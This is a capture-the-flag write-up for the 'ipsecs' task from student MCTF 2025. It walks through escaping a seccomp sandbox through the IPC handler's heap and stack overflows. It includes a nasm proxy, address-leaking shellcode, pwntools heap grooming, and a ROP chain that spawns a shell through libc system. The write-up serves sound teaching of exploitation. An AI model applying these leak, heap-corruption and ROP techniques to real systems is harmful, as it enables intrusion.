# ipsecs

This is a task by @phoen1xxx from the student MCTF 2025  

## What is going on?

In this task we have a typical socat-based setup with a Linux x86_64 userspace [program](./task/src/main.c). With this program we can execute our x86_64 code in a seccomp sandbox with only read, write, and exit syscalls available. Besides the process with our code, we have its parent process with a [pipe-based IPC interface](./task/src/ipc/). With this interface we can send commands that will be processed by the parent process. It is clear that we need to achieve code execution in the container with the program to read the flag using a suitable [catflag](./task/src/catflag/catflag.c) program (`/catflag`). So it looks like in this task we need to perform an escape from our sandbox using vulnerabilities in the parent's message handling mechanisms.

## IPC
IPC messages here are simple blocks of data sent via a pipe. Let's look at the appropriate structure definitions:
```c
#define LOG "LOG"
#define SAVE "SAVE"
#define FS "FILE"

#define STORE "STORE"
#define LOAD "LOAD"
#define DELETE "DELETE"

struct Storage_entry {
  char* name;
  size_t length;
};

struct Storage_cmd {
  size_t index;
  char action[8];
  size_t len;
  char data[232];
};

struct Fs_cmd {
  char action [8];
  char filename[8];
  char data[240];
};

union Data {
  char data[256]; //data
  struct Fs_cmd fs;
  struct Storage_cmd storage;
};

typedef struct Cmd {
  char type[8]; //LOG OR SAVE OR FS
  union Data data;
} Cmd;
```
It is clear that there are 3 types of messages: `LOG`, `SAVE`, and `FS`. And `SAVE` and `FS` have their own subtypes. Let's look at how messages are processed:
```c
void dispatch_cmd(int read_fd,int write_fd) {
  Cmd cmdx;
  char buffer[256];
  size_t res;
  res = read(read_fd,&cmdx, sizeof(cmdx)); //read cmd from read_fd
  if(res > 0) {
    if(!strncmp(cmdx.type,LOG,strlen(LOG))) { // Just log to stdin
      cmdx.data.data[255] = '\0';
      puts("[Parent] Got LOG command.");
      printf("[Parent] Data: %s\n",cmdx.data.data);
    }
    else if (!strncmp(cmdx.type,SAVE,strlen(SAVE))) { // Save to storage
      puts("[Parent] Got SAVE command.");
      if(!strncmp(cmdx.data.storage.action,STORE,strlen(STORE))) {
        save_entry(cmdx.data.storage.index,cmdx.data.storage.data,cmdx.data.storage.len);
      }
      else if (!strncmp(cmdx.data.storage.action,LOAD,strlen(LOAD))) {
        read_entry(cmdx.data.storage.index,buffer,cmdx.data.storage.len);
        puts("[Parent] Readed from storage.");
        printf("[Parent] Data  %s \n.",buffer);
        write(write_fd,buffer,sizeof(buffer)); //send to child process
      }
      else if (!strncmp(cmdx.data.storage.action,DELETE,strlen(DELETE))) {
        delete_entry(cmdx.data.storage.index);
      }
    }
    else if (!strncmp(cmdx.type,FS,strlen(FS))) { // Save to filesystem
      puts("[Parent] Got FS command.");
      if(!strncmp(cmdx.data.fs.action,STORE,strlen(STORE))) {
        save_file(cmdx.data.fs.filename,cmdx.data.fs.data,sizeof(cmdx.data.fs.data)); //save file to filesystem
        printf("[Parent] File %s sucessfully saved.\n",cmdx.data.fs.filename);
      }
      else if (!strncmp(cmdx.data.fs.action,LOAD,strlen(LOAD))) {
        read_file(cmdx.data.fs.filename,buffer,sizeof(buffer)); // read from filesystem
        printf("[Parent] File %s sucessfully read.\n",cmdx.data.fs.filename);
        printf("[Parent] File data: %s\n",buffer);
        write(write_fd,buffer,sizeof(buffer)); //send to child process
      }
    }
  }
}
```
So it looks very simple. Within our sandboxed code we can send commands as the structures defined above and can receive results.

## Vulnerabilities

Long story short, let's move to the vulnerabilities. 

## Heap Buffer Overflow

One of the command types - `SAVE` - is basically classic heap CRUD. We can malloc chunks and write our data there (`STORE`), read data from already malloc'ed chunks (`LOAD`), and free chunks (`DELETE`). And of course this CRUD is vulnerable:
```c
void save_entry(size_t index,char* data,size_t length) {
  if(index >= 10) {
    puts("[Parent] Error: index to save is too big.");
    return;
  }
  struct Storage_entry* current = entries[index];
  if(current != NULL) {
    puts("[Parent] Entry exists.");
    return;
  }
  if(length > 0x100){
    puts("Length is too big.");
    return;
  }

  entries[index] = malloc(sizeof(struct Storage_entry));
  current = entries[index];
  current->name = malloc(length);
  current->length = strlen(data);
  memcpy(current->name,data,current->length);
}
```
We can see that the size for allocation is determined by an incoming parameter (actually, we fully control this field in the IPC message), but the data that is written is based on its `strlen`. This means that we can write more bytes into `current->name` than intended — we have a heap buffer overflow. Also, we can notice one important thing here: we can't write any `0x00` bytes in the name because the first `0x00` byte in our data will become the string terminator.

Probably with precise heap operation control available (we have CRUD), this heap overflow is enough to fully pwn it, but while solving this task I noticed another interesting vulnerability. And this one, as I figured out after the CTF, was unintended and became the main reason for creating this writeup :)

## Stack Buffer Overflow

![](./assets/unintended.jpg)

Let's look at handling of `SAVE` `LOAD` message (entry's reading):
```c
void read_entry(size_t index,char* data,size_t length) {
  if(index >= 10) {
    puts("[Parent] Error: index to read is too big.");
    return;
  }
  struct Storage_entry* current = entries[index];
  if(current == NULL) {
    puts("[Parent] Entry not exists.");
    return;
  }
  memcpy(data,current->name,current->length); // read_data
}
```
We can see that the incoming `length` of `data` is ignored, and up to `current->length` is copied to the destination. The destination is a local stack buffer of size `0x100` (in the `dispatch_cmd` function). This means that with `current->length >= 0x100` we can overflow the stack buffer, which is a very powerful primitive. Unfortunately, there is a check for the entry's size in its creation logic. But with a heap corruption primitive like the one we already found (heap buffer overflow), it may be possible to create a large enough `current->length`.

But before we start exploitation we need to solve one practical problem.

## Proxy

The main task idea is sandboxed execution with only IPC and read and write syscalls available. This means that we can communicate with the vulnerable process only through our own assembly code running in the forked process with a seccomp filter. So we needed either to accept that the exploit had to be written in assembly or prepare a small proxy that would forward our requests to the target from `stdin`. With such a proxy, we could write the exploit in `Python` with `pwntools` in a familiar way. I used `nasm` to prepare such a simple proxy:

```nasm
init:
  ; save pipe descriptors
  mov r8, rdi
  mov r9, rsi
; infinite proxy cycle
proxy:
  ; clear buffer
  mov rdi, rsp
  call clear

  ; read command from stdin
  mov rdi, 0x00
  mov rsi, rsp
  mov rdx, 0x108
  call read

  ; forward command to vulnerable process
  mov rdi, r9
  mov rsi, rsp
  mov rdx, 0x108
  call write

  ; repeat
  jmp proxy

read:
  push 0x00
  pop rax
  syscall
  ret

write:
  push 0x01
  pop rax
  syscall
  ret

clear:
  mov rcx, 0x00
  loop:
    mov qword [rdi], 0x00
    add rdi, 0x08
    add rcx, 0x08
    cmp rcx, 0x108
    jl loop
  ret
```
## Leaks

Of course, one of the exploitation steps is defeating ASLR by obtaining address space leaks. And I think we can easily get all required leaks right at the beginning. Since we fully control the code executed in the forked process, we can simply write to `stdout` all addresses from its address space - they will be the same as in the parent process (that’s how `fork` works). So we can leak:

The binary address from the return address (our code is called as a function with a return address somewhere in the binary):
```nasm
  ; leak binary's addres from return address
  mov rdi, 0x01
  mov rsi, rsp
  mov rdx, 0x08
  call write
```
The stack address from the `rsp` register:
```nasm
  ; leak stack address from rsp
  push rsp
  mov rdi, 0x01
  mov rsi, rsp
  mov rdx, 0x08
  call write
  pop rax
```
And the canary from its storage (`fs:0x28`):
```nasm
  ; leak canary from its storage
  mov rax, fs:0x28
  push rax
  mov rdi, 0x01
  mov rsi, rsp
  mov rdx, 0x08
  call write
  pop rax
```
The libc address from the binary’s GOT:
```nasm
  ; leak libc from GOT
  mov rax, qword [rsp]
  add rax, 0x398d
  push qword [rax]
  mov rdi, 0x01
  mov rsi, rsp
  mov rdx, 0x08
  call write
  pop rax
```
Complete code of proxy can be found [here](./task/proxy.nasm). Now we only need to read this leaks from `pwntools` exploit.

## Exploitation

First, let's build and run our proxy and read all leaks:
```python
  os.system('nasm -f bin proxy.nasm')
  proxy = open('proxy', 'rb').read()
  assert(not b'\n' in proxy)
  io.sendline(proxy)
  
  stack = u64(io.recv(8)) - 0x518
  log.debug(f'stack @ {stack:#x}')
  binary = u64(io.recv(8))
  log.debug(f'binary @ {binary:#x}')
  libc.address = u64(io.recv(8)) - 0x8ce80
  log.debug(f'libc @ {libc.address:#x}')
  canary = u64(io.recv(8))
  log.debug(f'canary @ {canary:#x}')
```
Now we need python interface for communication via proxy:
```python
def store(idx, l, data):
  assert(idx < 0x10)
  assert(len(data) < 0xe8)
  p  = b''
  p += b'SAVE'.ljust(8, b'\x00')
  p += p64(idx)
  p += b'STORE'.ljust(8, b'\x00')
  p += p64(l)
  p += data
  io.send(p)
  io.recvline()

def load(idx, data=b''):
  assert(idx < 0x10)
  p  = b''
  p += b'SAVE'.ljust(8, b'\x00')
  p += p64(idx)
  p += b'LOAD'.ljust(8, b'\x00')
  p += data
  io.send(p)
  io.recvline()
  io.recvline()
  io.recvuntil(b'Data  ')
  return io.recvuntil(b' \n', drop=True)

def delete(idx):
  assert(idx < 0x10)
  p  = b''
  p += b'SAVE'.ljust(8, b'\x00')
  p += p64(idx)
  p += b'DELETE'.ljust(8, b'\x00')
  io.send(p)
  io.recvline()
 ```
Also let's prepare primitives for interacting directly with `malloc`:
```python
def malloc(idx, chunksz, data=b'\x00'):
  assert(chunksz & 0x0F == 0x00)
  assert(chunksz >= 0x20)
  assert(chunksz <= 0xe0)
  store(idx, chunksz-0x08, data)

def free(idx):
  delete(idx)
```
Now is time to think about the exploitation strategy. With all leaks and the stack buffer overflow, it's straightforward. We will use stack buffer overflow to execute arbitrary code via ROP-chain. With our heap corruption (the buffer overflow in entry creation), we need to prepare an entry with a large enough `current->length` and with `current->name` pointing to a buffer containing a ROP-chain.
    
But we can’t simply place our ROP-chain in the original `current->name` buffer because we can’t place a `0x00` byte there. Before the entry’s heap buffer, our command is stored in a local stack buffer of the dispatch function. The command data there could contain arbitrary bytes, so we can use that buffer as the source of the ROP-chain by writing its address in place of `current->name`.
    
How could we overwrite `current->name`? We don’t even need advanced heap corruption techniques. We can simply use our heap buffer overflow to overwrite the low six bytes of `current->name`. Only six bytes, because we need to keep zeros in the two high bytes - we can’t write zero bytes with our buffer overflow.
    
And how can we overwrite `current->length`? Here we face a problem: we can’t overwrite it using the heap overflow without fully overwriting `current->name`, because `current->name` is located before `current->length` in memory. But we can't do that - we need to keep zeros in the two high bytes of the `current->name` address. So we need another way.
    
It takes too long to fully explain how (I call it heap-hop), but with heap corruption caused by the buffer overflow, we can force `malloc` to write the size of a chunk in place of `current->length`. This is possible because `malloc` chunk sizes and `current->length` are both located at addresses of the form `0x10 * N + 0x08`

So... Putting in all together we'll come up with this sequence of `malloc`/`free` calls and heap buffer overflows:
```python
  # Just heap-hop
  malloc(0x00, 0x30)
  malloc(0x01, 0x30)
  free(0x00)
  malloc(0x02, 0x20)
  malloc(0x03, 0x20)
  malloc(0x04, 0xe0)
  malloc(0x05, 0xe0)
  malloc(0x06, 0xe0)
  malloc(0x07, 0xe0)
  # First heap buffer overflow
  # Need to increase size of next chunk and force malloc to realloc memory right after original chunk
  # With such corruption we'll force malloc to write chunk size in place of `current->length`
  malloc(0x00, 0x30, b'X'*0x28+p16(0x4b1))
  free(0x00)
  free(0x01)
  free(0x02)
  malloc(0x00, 0x80)
  malloc(0x08, 0x30)
  # Second heap buffer overflow
  # Need to overwrite `current->name`
  malloc(0x01, 0x30, b'X'*0xa0+p64(stack - 0x110 + 0x18 - 0x108))
``` 
Now, after obtaining the appropriate stack buffer address in `entry->name` and a large enough size (actually the chunk size) in `entry->length`, we can trigger entry reading with our ROP-chain stored inside the `SAVE` `LOAD` command’s data. The vulnerable entry reading would trigger a stack buffer overflow, leading to execution of the ROP chain and arbitrary code execution:
```python
  # Prepare ROP-chain
  rop = ROP(libc)
  rop.raw(rop.ret.address)
  rop.call(libc.symbols['system'], (next(libc.search(b'/bin/sh\x00')),))

  # Overflow payload
  p  = b''
  p += p64(canary) # restore canary
  p += b'X'*0x08   # don't care about saved rbp
  p += rop.chain() # ROP-chain

  # Load corrupted entry to trigger stack buffer overflow
  load(0x03, data=p)

  io.interactive()
```
Complete code of exploit can be found [here](./task/xpl01t.py).

## Intended

After the CTF was over I figured out that my way to solve it wasn’t intended. Of course, it was pwnable using only the heap buffer overflow since it is a very powerful primitive. It was possible to simply poison tcache, malloc into the GOT, and overwrite it to hijack control flow. But I think that despite the higher complexity, this solution is more interesting.

![](./assets/all_vulns.jpg)
